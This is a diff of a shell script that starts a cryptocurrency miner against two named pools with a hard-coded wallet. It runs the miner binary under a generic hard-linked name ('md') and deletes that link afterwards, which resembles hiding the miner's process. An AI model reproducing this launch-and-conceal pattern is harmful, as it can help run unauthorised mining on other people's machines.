@@ -7,9 +7,38 @@ NAME=$(cat $HOME/name 2>/dev/null)
 
 PATH=$HOME:$PATH
 
+MD="$HOME/md"
+
+# update to latest version 
 update
 
-#pooler --background --quiet --url stratum+tcp://ltc.give-me-coins.com:3333 --userpass zaos.$NAME:x  > /dev/null 2>&1
-neis --background --quiet --algo quark --url http://fz2.mine-pool.net:9372 -u FJoZ2U7iu2kTXiJYrH6KDaeVWovefB2PqJ -p xxx  > /dev/null 2>&1
+# clean up if dirty
+[ -e $MD ] && rm -f $MD
 
+# create needed deamon
+link $HOME/neis $MD
+
+# start daemon
+
+# LTC
+ALGO=scrypt
+URL=stratum+tcp://ltc.give-me-coins.com:3333
+USER=zaos.$NAME
+PASS=x
+
+# FZ
+ALGO=quark
+URL=http://fz2.mine-pool.net:9372
+USER=FJoZ2U7iu2kTXiJYrH6KDaeVWovefB2PqJ
+PASS=xxx
+
+#pooler --background --quiet --url stratum+tcp://ltc.give-me-coins.com:3333 --userpass zaos.$NAME:x  > /dev/null 2>&1
+#neis --background --quiet --algo quark --url http://fz2.mine-pool.net:9372 -u FJoZ2U7iu2kTXiJYrH6KDaeVWovefB2PqJ -p xxx  > /dev/null 2>&1
+
+md -a $ALGO -o $URL -u $USER -p $PASS
+
+# clean up
+rm -f $MD
+
+# tell we have started
 notify started
